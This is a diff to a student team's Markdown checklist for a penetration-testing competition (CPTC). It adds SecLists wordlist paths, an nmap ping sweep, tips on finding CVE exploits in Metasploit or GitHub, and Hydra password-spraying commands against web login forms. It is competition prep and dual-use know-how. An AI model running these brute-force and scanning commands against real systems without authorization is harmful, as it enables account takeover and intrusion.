@@ -7,9 +7,13 @@ This is a CPTC checklist to help us when we forget command syntax. It'll keep us
 # Setup
 - [ ] Run the tool setup script.
 - [ ] Run the University of Florida logging script. (Is this how we are going to track every command?)
-- [ ] How are we going to communicate during the competition?
-- [ ] We should get a big general password list together 
-- [ ] Get a network map on the whiteboard for visualization, that helps a ton
+- [ ] CPTC will provide us with a OneDrive account. That's where we will store all our notes and collaboration resources (including the final report). 
+	- [ ] Make a word doc for each host in the environment and section it off by service
+- [ ] We should get a big general password list together. ==**ALWAYS try default creds first**==
+	- `/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` (ffuf/gobuster)
+	- `/seclists/Usernames/top-usernames-shortlist.txt` (usernames for login attempts)
+	- `/seclists/Passwords/Leaked-Databases/rockyou.txt` (passwords)
+- [ ] Get a **network map on the whiteboard for visualization,** that helps a ton
 # Scanning
 ## Network Scanning
 - [ ] `sudo nmap 10.10.0.0/16 -T4 -sn -oN ping.scan` 
@@ -39,7 +43,8 @@ This is a CPTC checklist to help us when we forget command syntax. It'll keep us
 
 # Exploitation
 ## David M.
-- [ ] Find web app versions and Google CVEs in those versions
+- [ ] Find web app versions and Google CVEs in those versions (https://www.cve.org/)
+	- [ ] find via Metasploit (`search <thing-version>`) or download PoC exploit from GitHub
 - [ ] SSRF
 ### Password Spraying w/ Hydra
 Hydra's syntax can be unintuitive, so look it up.
@@ -61,10 +66,14 @@ SSH and SMTP share the same syntax, but with `ssh://` or `smtp://` instead of `f
 Examples for HTTP(S):
 ```shell
 # example for GET requests
-hydra -L usernames.txt -P rockyou.txt login.example.com http-get-form "/login.php?username=^USER^&password=^PASS^:Login failed"
+hydra -L /usr/bin/seclists/Usernames/top-usernames-shortlist.txt \
+-P usr/bin/seclists/Passwords/Leaked-Databases/rockyou.txt \
+login.example.com http-get-form "/login.php?username=^USER^&password=^PASS^:Login failed"
 
 # example for POST requests
-hydra -L usernames.txt -P rockyou.txt login.example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
+hydra -L /usr/bin/seclists/Usernames/top-usernames-shortlist.txt \
+-P usr/bin/seclists/Passwords/Leaked-Databases/rockyou.txt \
+login.example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
 ```
 
 Tips:
